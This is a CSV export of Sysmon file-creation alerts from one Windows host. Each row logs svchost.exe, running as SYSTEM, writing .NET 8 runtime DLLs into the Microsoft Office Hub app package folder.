"2025-12-26 11:29:12.140 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175110,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.CompilerServices.VisualC.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.138 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.138","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.141 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175111,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.140 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.140","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.141 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175112,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.Extensions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.140 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.140","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.142 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175113,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.Handles.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.140 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.140","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.144 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175114,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.InteropServices.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.142 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.142","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.145 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175115,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.InteropServices.JavaScript.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.142 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.142","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.145 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175116,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.InteropServices.RuntimeInformation.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.144 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.144","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.146 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175117,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.Intrinsics.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.144 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.144","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.146 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175118,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.Loader.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.144 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.144","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.147 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175119,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.Numerics.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.144 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.146","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.147 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175120,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.Serialization.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.146 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.146","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.148 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175121,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.Serialization.Formatters.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.146 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.146","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.149 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175122,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.Serialization.Json.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.148 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.148","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.149 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175123,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.Serialization.Primitives.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.148 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.148","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.150 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175124,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.Serialization.Xml.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.148 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.148","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.150 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175125,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.AccessControl.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.148 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.148","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.151 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175126,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.Claims.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.150 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.150","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.151 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175127,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.Cryptography.Algorithms.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.150 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.150","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.152 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175128,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.Cryptography.Cng.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.150 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.150","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.153 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175129,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.Cryptography.Csp.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.150 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.150","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.153 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175130,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.Cryptography.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.152 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.152","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.154 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175131,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.Cryptography.Encoding.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.152 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.152","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.155 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175132,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.Cryptography.OpenSsl.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.152 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.152","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.155 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175133,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.Cryptography.Primitives.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.154 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.154","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.156 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175134,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.Cryptography.X509Certificates.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.154 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.154","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.156 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175135,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.154 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.154","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.156 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175136,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.Principal.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.154 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.154","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.162 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175137,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.Principal.Windows.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.156 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.156","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.163 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175138,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Security.SecureString.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.156 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.156","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.163 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175139,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.ServiceModel.Web.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.156 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.156","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.164 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175140,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.ServiceProcess.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.156 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.158","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.164 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175141,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Text.Encoding.CodePages.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.158 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.158","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.165 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175142,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Text.Encoding.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.158 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.158","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.165 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175143,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Text.Encoding.Extensions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.160 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.160","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.165 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175144,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Text.Encodings.Web.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.160 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.160","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.165 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175145,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Text.Json.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.162 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.162","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.167 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175146,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Text.RegularExpressions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.162 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.162","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
